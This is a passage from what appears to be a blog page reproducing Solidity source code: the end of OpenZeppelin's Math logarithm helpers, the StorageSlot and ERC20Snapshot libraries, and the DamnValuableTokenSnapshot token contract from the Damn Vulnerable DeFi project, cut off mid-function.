uint256 result = <span class="built_in">log10</span>(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">10</span> ** result &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 256, rounded down, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log256</span><span class="params">(uint256 value)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        uint256 result = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">128</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">128</span>;</span><br><span class="line">                result += <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">64</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">64</span>;</span><br><span class="line">                result += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">32</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">                result += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">16</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                value &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">                result += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; <span class="number">8</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                result += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.</span></span><br><span class="line"><span class="comment">     * Returns 0 if given 0.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">log256</span><span class="params">(uint256 value, Rounding rounding)</span> internal pure <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 result = log256(value);</span><br><span class="line">            <span class="keyword">return</span> result + (rounding == Rounding.Up &amp;&amp; <span class="number">1</span> &lt;&lt; (result &lt;&lt; <span class="number">3</span>) &lt; value ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="StorageSlot-sol"><a href="#StorageSlot-sol" class="headerlink" title="StorageSlot.sol"></a>StorageSlot.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (utils/StorageSlot.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Library for reading and writing primitive types to specific storage slots.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.</span></span><br><span class="line"><span class="comment"> * This library helps with reading and writing to such slots without the need for inline assembly.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example usage to set ERC1967 implementation slot:</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> * contract ERC1967 &#123;</span></span><br><span class="line"><span class="comment"> *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     function _getImplementation() internal view returns (address) &#123;</span></span><br><span class="line"><span class="comment"> *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     function _setImplementation(address newImplementation) internal &#123;</span></span><br><span class="line"><span class="comment"> *         require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span></span><br><span class="line"><span class="comment"> *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library StorageSlot &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSlot</span> &#123;</span></span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BooleanSlot</span> &#123;</span></span><br><span class="line">        <span class="type">bool</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Bytes32Slot</span> &#123;</span></span><br><span class="line">        bytes32 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Uint256Slot</span> &#123;</span></span><br><span class="line">        uint256 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `AddressSlot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">getAddressSlot</span><span class="params">(bytes32 slot)</span> internal pure <span class="title function_">returns</span> <span class="params">(AddressSlot storage r)</span> &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DamnValuableTokenSnapshot-sol"><a href="#DamnValuableTokenSnapshot-sol" class="headerlink" title="DamnValuableTokenSnapshot.sol"></a>DamnValuableTokenSnapshot.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title DamnValuableTokenSnapshot</span></span><br><span class="line"><span class="comment"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract DamnValuableTokenSnapshot is ERC20Snapshot &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 private lastSnapshotId;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 initialSupply) ERC20(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">snapshot</span><span class="params">()</span> public <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        lastSnapshotId = _snapshot();</span><br><span class="line">        <span class="keyword">return</span> lastSnapshotId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getBalanceAtLastSnapshot</span><span class="params">(address account)</span> external view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOfAt(account, lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getTotalSupplyAtLastSnapshot</span><span class="params">()</span> external view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalSupplyAt(lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ERC20Snapshot-sol"><a href="#ERC20Snapshot-sol" class="headerlink" title="ERC20Snapshot.sol"></a>ERC20Snapshot.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/extensions/ERC20Snapshot.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../ERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Arrays.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and</span></span><br><span class="line"><span class="comment"> * total supply at the time are recorded for later access.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting.</span></span><br><span class="line"><span class="comment"> * In naive implementations it&#x27;s possible to perform a &quot;double spend&quot; attack by reusing the same balance from different</span></span><br><span class="line"><span class="comment"> * accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be</span></span><br><span class="line"><span class="comment"> * used to create an efficient ERC20 forking mechanism.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Snapshots are created by the internal &#123;_snapshot&#125; function, which will emit the &#123;Snapshot&#125; event and return a</span></span><br><span class="line"><span class="comment"> * snapshot id. To get the total supply at the time of a snapshot, call the function &#123;totalSupplyAt&#125; with the snapshot</span></span><br><span class="line"><span class="comment"> * id. To get the balance of an account at the time of a snapshot, call the &#123;balanceOfAt&#125; function with the snapshot id</span></span><br><span class="line"><span class="comment"> * and the account address.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> Snapshot policy can be customized by overriding the &#123;_getCurrentSnapshotId&#125; method. For example, having it</span></span><br><span class="line"><span class="comment"> * return `block.number` will trigger the creation of snapshot at the beginning of each new block. When overriding this</span></span><br><span class="line"><span class="comment"> * function, be careful about the monotonicity of its result. Non-monotonic snapshot ids will break the contract.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implementing snapshots for every block using this method will incur significant gas costs. For a gas-efficient</span></span><br><span class="line"><span class="comment"> * alternative consider &#123;ERC20Votes&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ==== Gas Costs</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Snapshots are efficient. Snapshot creation is _O(1)_. Retrieval of balances or total supply from a snapshot is _O(log</span></span><br><span class="line"><span class="comment"> * n)_ in the number of snapshots that have been created, although _n_ for a specific account will generally be much</span></span><br><span class="line"><span class="comment"> * smaller since identical balances in subsequent snapshots are stored as a single entry.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There is a constant overhead for normal ERC20 transfers due to the additional snapshot bookkeeping. This overhead is</span></span><br><span class="line"><span class="comment"> * only significant for the first transfer that immediately follows a snapshot for a particular account. Subsequent</span></span><br><span class="line"><span class="comment"> * transfers will have normal cost until the next snapshot, and so on.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">abstract contract ERC20Snapshot is ERC20 &#123;</span><br><span class="line">    <span class="comment">// Inspired by Jordi Baylina&#x27;s MiniMeToken to record historical balances:</span></span><br><span class="line">    <span class="comment">// https://github.com/Giveth/minime/blob/ea04d950eea153a04c51fa510b068b9dded390cb/contracts/MiniMeToken.sol</span></span><br><span class="line"></span><br><span class="line">    using Arrays <span class="keyword">for</span> uint256[];</span><br><span class="line">    using Counters <span class="keyword">for</span> Counters.Counter;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Snapshotted values have arrays of ids and the value corresponding to that id. These could be an array of a</span></span><br><span class="line">    <span class="comment">// Snapshot struct, but that would impede usage of functions that work on an array.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Snapshots</span> &#123;</span></span><br><span class="line">        uint256[] ids;</span><br><span class="line">        uint256[] values;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Snapshots) private _accountBalanceSnapshots;</span><br><span class="line">    Snapshots private _totalSupplySnapshots;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Snapshot ids increase monotonically, with the first value being 1. An id of 0 is invalid.</span></span><br><span class="line">    Counters.Counter private _currentSnapshotId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Emitted by &#123;_snapshot&#125; when a snapshot identified by `id` is created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    event <span class="title function_">Snapshot</span><span class="params">(uint256 id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Creates a new snapshot and returns its snapshot id.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Emits a &#123;Snapshot&#125; event that contains the same id.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &#123;_snapshot&#125; is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a</span></span><br><span class="line"><span class="comment">     * set of accounts, for example using &#123;AccessControl&#125;, or it may be open to the public.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * [WARNING]</span></span><br><span class="line"><span class="comment">     * ====</span></span><br><span class="line"><span class="comment">     * While an open way of calling &#123;_snapshot&#125; is required for certain trust minimization mechanisms such as forking,</span></span><br><span class="line"><span class="comment">     * you must consider that it can potentially be used by attackers in two ways.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow</span></span><br><span class="line"><span class="comment">     * logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target</span></span><br><span class="line"><span class="comment">     * specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs</span></span><br><span class="line"><span class="comment">     * section above.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * We haven&#x27;t measured the actual numbers; if this is something you&#x27;re interested in please reach out to us.</span></span><br><span class="line"><span class="comment">     * ====</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _snapshot() internal virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        _currentSnapshotId.increment();</span><br><span class="line"></span><br><span class="line">        uint256 currentId = _getCurrentSnapshotId();</span><br><span class="line">        emit <span class="title function_">Snapshot</span><span class="params">(currentId)</span>;</span><br><span class="line">        <span class="keyword">return</span> currentId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Get the current snapshotId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _getCurrentSnapshotId() internal view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _currentSnapshotId.current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Retrieves the balance of `account` at the time `snapshotId` was created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">balanceOfAt</span><span class="params">(address account, uint256 snapshotId)</span> public view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> snapshotted, uint256 value) = _valueAt(snapshotId, _accountBalanceSnapshots[account]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> snapshotted ? value : balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Retrieves the total supply at the time `snapshotId` was created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">totalSupplyAt</span><span class="params">(uint256 snapshotId)</span> public view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> snapshotted, uint256 value) = _valueAt(snapshotId, _totalSupplySnapshots);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> snapshotted ? value : totalSupply();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update balance and/or total supply snapshots before the values are modified. This is implemented</span></span><br><span class="line">    <span class="comment">// in the _beforeTokenTransfer hook, which is executed for _mint, _burn, and _transfer operations.</span></span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override &#123;</span><br><span class="line">        super._beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// mint</span></span><br><span class="line">            _updateAccountSnapshot(to);</span><br><span class="line">            _updateTotalSupplySnapshot();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (to == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// burn</span></span><br><span class="line">            _updateAccountSnapshot(from);</span><br><span class="line">            _updateTotalSupplySnapshot();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// transfer</span></span><br><span class="line">            _updateAccountSnapshot(from);</span><br><span class="line">            _updateAccountSnapshot(to);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>, uint256)</span> &#123;</span><br><span class="line">        require(snapshotId &gt; <span class="number">0</span>, <span class="string">&quot;ERC20Snapshot: id is 0&quot;</span>);</span><br><span class="line">        require(snapshotId &lt;= _getCurrentSnapshotId(), <span class="string">&quot;ERC20Snapshot: nonexistent id&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// When a valid snapshot is queried, there are three possibilities:</span></span><br><span class="line">        <span class="comment">//  a) The queried value was not modified after the snapshot was taken. Therefore, a snapshot entry was never</span></span><br><span class="line">        <span class="comment">//  created for this id, and all stored snapshot ids are smaller than the requested one. The value that corresponds</span></span><br><span class="line">        <span class="comment">//  to this id is the current one.</span></span><br><span class="line">        <span class="comment">//  b) The queried value was modified after the snapshot was taken. Therefore, there will be an entry with the</span></span><br><span class="line">        <span class="comment">//  requested id, and its value is the one to return.</span></span><br><span class="line">        <span class="comment">//  c) More snapshots were created after the requested one, and the queried value was later modified. There will be</span></span><br><span class="line">        <span class="comment">//  no entry for the requested id: the value that corresponds to it is that of the smallest snapshot id that is</span></span><br><span class="line">        <span class="comment">//  larger than the requested one.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// In summary, we need to find an element in an array, returning the index of the smallest value that is larger if</span></span><br><span class="line">        <span class="comment">// it is not found, unless said value doesn&#x27;t exist (e.g. when all values are smaller). Arrays.findUpperBound does</span></span><br><span class="line">        <span class="comment">// exactly this.</span></span><br><span class="line"></span><br><span class="line">        uint256 index = snapshots.ids.findUpperBound(snapshotId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == snapshots.ids.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">true</span>, snapshots.values[index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateAccountSnapshot(address account) private &#123;</span><br><span class="line">        _updateSnapshot(_accountBalanceSnapshots[account], balanceOf(account));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function 